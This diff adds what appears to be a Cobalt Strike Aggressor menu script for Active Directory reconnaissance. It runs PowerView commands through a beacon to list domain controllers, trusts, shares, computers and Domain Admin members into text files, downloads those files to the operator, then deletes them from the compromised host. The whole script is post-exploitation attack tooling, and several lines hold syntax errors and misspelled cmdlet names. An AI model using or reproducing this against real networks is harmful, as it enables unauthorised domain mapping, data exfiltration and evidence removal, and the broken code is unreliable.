@@ -1,0 +1,38 @@
+popup powerview {
+
+#get powershell version	
+	item("&PS Version", { bpowershell($1, '$PSVersionTable.PSVersion'); });
+
+#import powerview
+	item("&Import Powerview", { bpowershell_import($1, script_resource("/root/powerview.ps1"));
+
+#Query DCs, Trusts, Shares, Full Computers, and Domain Admins
+	item("&Domain Queries", {
+		bpowershell($1, "Get-NetDomain Controllers | Out-File -Encoding ascii DCs.txt");
+		bpowershell($1, "Get-NetDomain Trusts | Out-File -Encoding ascii trusts.txt");
+		bpowershell($1, "Invoke-ShareFiner -Ping -ExcludeIPC -ExcludePrint -CheckShareAcess | Out-File -Encoding ascii shares.txt");
+		bpowershell($1, "Get-NetComputers -FullData | Out-File -Encoding ascii computers.txt");
+		bpowershell($1, "Get-NetGroupMember -Recurse" | Out-File -Encoding ascii DAs.txt");
+});
+
+#download outputs
+	item("&Download files", {
+		bdownload($1, ".\DCs.txt");
+		bdownload($1, ".\trusts.txt");
+		bdownload($1, ".\shares.txt");
+		bdownload($1, ".\computers.txt");
+		bdownload($1, ".\DAs.txt");
+
+});
+
+#delete files
+	item("&Delete files", {
+		brm($1, ".\DCs.txt");
+		brm($1, ".\trusts.txt");
+		brm($1, ".\shares.txt");
+		brm($1, ".\computers.txt");
+		brm($1, ".\DAs.txt");
+
+});
+
+}
